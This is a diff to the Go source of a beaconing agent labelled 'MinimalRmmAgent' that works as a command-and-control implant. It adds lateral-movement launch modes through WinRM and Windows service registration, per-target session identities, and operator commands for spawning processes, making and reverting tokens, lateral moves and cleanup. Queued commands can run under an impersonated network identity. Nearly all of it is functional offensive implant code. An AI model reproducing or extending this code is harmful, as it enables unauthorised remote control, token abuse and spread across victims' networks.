@@ -33,6 +33,7 @@ type config struct {
 	BaseURL       string
 	BeaconSecret  string
 	SessionID     string
+	WorkspaceID   string
 	HTTPProxy     string
 	SleepSeconds  int
 	JitterPercent int
@@ -65,6 +66,7 @@ var (
 	defaultBaseURLB64       string
 	defaultBeaconSecretB64  string
 	defaultSessionIDB64     string
+	defaultWorkspaceIDB64   string
 	defaultHTTPProxyB64     string
 	defaultSleepSecondsB64  string
 	defaultJitterPercentB64 string
@@ -75,6 +77,57 @@ var (
 
 var pluginCommandPattern = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._-]{0,127}$`)
 var commandPrefixPattern = regexp.MustCompile(`(?i)^(ps|powershell|pwsh|cmd)\s*:\s*(.*)$`)
+var agentWorkspaceIDPattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$`)
+var agentSessionIDPattern = regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`)
+var agentServiceNamePattern = regexp.MustCompile(`^MinimalRmmAgent-[0-9a-f]{32}$`)
+var agentServiceName = defaultLateralServiceName
+
+type lateralStartup struct {
+	SessionID    string
+	WorkspaceID  string
+	WorkspaceSet bool
+	ServiceName  string
+}
+
+// lateralStartupConfig parses the supported target launch arguments without
+// treating arbitrary process arguments as environment configuration.
+func lateralStartupConfig(args []string) (string, string, error) {
+	startup, err := parseLateralStartup(args)
+	return startup.SessionID, startup.WorkspaceID, err
+}
+
+// parseLateralStartup keeps the generated SCM name and workspace binding
+// independent, accepting each optional identity flag only once.
+func parseLateralStartup(args []string) (lateralStartup, error) {
+	startup := lateralStartup{ServiceName: defaultLateralServiceName}
+	if len(args) < 2 || len(args)%2 != 0 || args[0] != "--lateral-session" || !agentSessionIDPattern.MatchString(args[1]) {
+		return startup, errors.New("invalid lateral startup arguments")
+	}
+	startup.SessionID = args[1]
+	seenService := false
+	for i := 2; i < len(args); i += 2 {
+		switch args[i] {
+		case "--workspace-id":
+			value := args[i+1]
+			if startup.WorkspaceSet || (value != "" && value != "-" && !agentWorkspaceIDPattern.MatchString(value)) {
+				return startup, errors.New("invalid or duplicate lateral workspace ID")
+			}
+			startup.WorkspaceSet = true
+			if value != "-" {
+				startup.WorkspaceID = value
+			}
+		case "--service-name":
+			if seenService || !agentServiceNamePattern.MatchString(args[i+1]) {
+				return startup, errors.New("invalid or duplicate lateral service name")
+			}
+			seenService = true
+			startup.ServiceName = args[i+1]
+		default:
+			return startup, errors.New("unknown lateral startup flag")
+		}
+	}
+	return startup, nil
+}
 
 func main() {
 	if len(os.Args) > 1 && (os.Args[1] == "--plugin-child" || os.Args[1] == "--plugin-library-child") {
@@ -88,11 +141,59 @@ func main() {
 		}
 		return
 	}
-	ctx, stopSignals := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
-	defer stopSignals()
-	agentContext = ctx
+	if len(os.Args) > 2 && os.Args[1] == "--lateral-child" {
+		if err := runLateralChild(os.Args[1:]); err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(3)
+		}
+		return
+	}
+	if len(os.Args) > 2 && os.Args[1] == "--lateral-cleanup-child" {
+		if err := runLateralCleanupChild(os.Args[1:]); err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(3)
+		}
+		return
+	}
+	if len(os.Args) > 2 && os.Args[1] == "--lateral-detach" {
+		// A WinRM shell started this copy inside its job object; it
+		// re-registers itself as a local service and exits immediately.
+		if err := runLateralDetach(os.Args[2:]); err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(3)
+		}
+		return
+	}
+	if len(os.Args) > 1 && os.Args[1] == "--lateral-session" {
+		// A lateral move started this copy on another host; the target must
+		// register under its own identity instead of the embedded default.
+		startup, err := parseLateralStartup(os.Args[1:])
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(3)
+		}
+		os.Setenv("RMM_SESSION_ID", startup.SessionID)
+		agentServiceName = startup.ServiceName
+		if startup.WorkspaceSet {
+			os.Setenv("RMM_AGENT_WORKSPACE_ID", startup.WorkspaceID)
+		}
+	}
 	initAgentLog()
 	defer closeAgentLog()
+	if runAsWindowsService() {
+		// The SCM started this process as a service; the beacon loop already
+		// ran to completion inside the service entry point.
+		return
+	}
+	ctx, stopSignals := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	defer stopSignals()
+	runAgentLoop(ctx)
+}
+
+// runAgentLoop is the beacon body shared by interactive, service, and
+// lateral-started contexts.
+func runAgentLoop(ctx context.Context) {
+	agentContext = ctx
 	cfg, err := loadConfig()
 	if err != nil {
 		logf("configuration error: %v", err)
@@ -245,10 +346,16 @@ func loadConfig() (*config, error) {
 		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", embeddedValue(defaultBaseURLB64)), "/"),
 		BeaconSecret:  envOr("RMM_BEACON_SECRET", embeddedValue(defaultBeaconSecretB64)),
 		SessionID:     envOr("RMM_SESSION_ID", embeddedValue(defaultSessionIDB64)),
+		WorkspaceID:   strings.TrimSpace(envOr("RMM_AGENT_WORKSPACE_ID", embeddedValue(defaultWorkspaceIDB64))),
 		HTTPProxy:     strings.TrimSpace(envOr("RMM_HTTP_PROXY", embeddedValue(defaultHTTPProxyB64))),
 		SleepSeconds:  envInt("RMM_SLEEP_SECONDS", envIntValue(defaultSleepSecondsB64, 60)),
 		JitterPercent: envInt("RMM_JITTER_PERCENT", envIntValue(defaultJitterPercentB64, 30)),
 		MaxRetries:    envInt("RMM_MAX_RETRIES", 3),
+	}
+	// An explicitly empty binding clears an embedded owner when the server
+	// launches an unassigned child; absent environment keeps the build default.
+	if workspaceID, present := os.LookupEnv("RMM_AGENT_WORKSPACE_ID"); present {
+		cfg.WorkspaceID = strings.TrimSpace(workspaceID)
 	}
 	if cfg.BaseURL == "" || cfg.BeaconSecret == "" {
 		return nil, errors.New("RMM_BASE_URL and RMM_BEACON_SECRET are required")
@@ -257,6 +364,9 @@ func loadConfig() (*config, error) {
 		// The server accepts only token-safe session IDs. Hostnames may contain
 		// dots, so do not use the raw hostname as the identifier.
 		cfg.SessionID = fmt.Sprintf("go-%d", time.Now().UnixNano())
+	}
+	if cfg.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(cfg.WorkspaceID) {
+		return nil, errors.New("invalid agent workspace ID")
 	}
 	if cfg.SleepSeconds < 1 {
 		cfg.SleepSeconds = 1
@@ -278,6 +388,9 @@ func register(client *http.Client, cfg *config) error {
 	v.Set("j", strconv.Itoa(cfg.JitterPercent))
 	v.Set("sync", "1")
 	v.Set("agent", "go")
+	if cfg.WorkspaceID != "" {
+		v.Set("workspace_id", cfg.WorkspaceID)
+	}
 	if runtime.GOOS == "windows" && runtime.GOARCH == "amd64" {
 		v.Set("caps", "pe,rclone-plugin,socks-plugin,tun-plugin")
 	} else {
@@ -361,6 +474,48 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 	}
 	if trimmed == "__STOP__" || trimmed == "__EXIT__" {
 		return "Go agent does not terminate from a queued command; stop its process on the host.", "output"
+	}
+	if trimmed == "__SPAWN__" || strings.HasPrefix(trimmed, "__SPAWN__\n") {
+		result, err := spawnCommand(trimmed, cfg)
+		if err != nil {
+			return "Spawn failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if strings.HasPrefix(trimmed, "__MAKE_TOKEN__") {
+		result, err := makeTokenCommand(trimmed)
+		if err != nil {
+			return "Make token failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if trimmed == "__REV2SELF__" {
+		result, err := rev2selfAction()
+		if err != nil {
+			return "Rev2self failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if strings.HasPrefix(trimmed, "__LATERAL__") {
+		result, err := lateralCommand(trimmed)
+		if err != nil {
+			return "Lateral failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if strings.HasPrefix(trimmed, "__LATERAL_CLEANUP__") {
+		result, err := lateralCleanupCommand(trimmed)
+		if err != nil {
+			return "Lateral cleanup failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if trimmed == "__UID__" {
+		result, err := uidAction()
+		if err != nil {
+			return "Uid failed: " + err.Error(), "output"
+		}
+		return result, "output"
 	}
 	if strings.HasPrefix(trimmed, "__DOWNLOAD__ ") {
 		result, _ := downloadFile(strings.TrimSpace(strings.TrimPrefix(trimmed, "__DOWNLOAD__ ")))
@@ -520,7 +675,11 @@ func runCommand(command string) (string, string) {
 	if err != nil {
 		return err.Error(), "output"
 	}
-	out, err := newCommand(name, args...).CombinedOutput()
+	// Operator commands created while a make_token identity is active run
+	// under that network identity (runas /netonly semantics).
+	child := newCommand(name, args...)
+	applyCommandToken(child)
+	out, err := child.CombinedOutput()
 	if err != nil {
 		return string(out) + "\n" + err.Error(), "output"
 	}
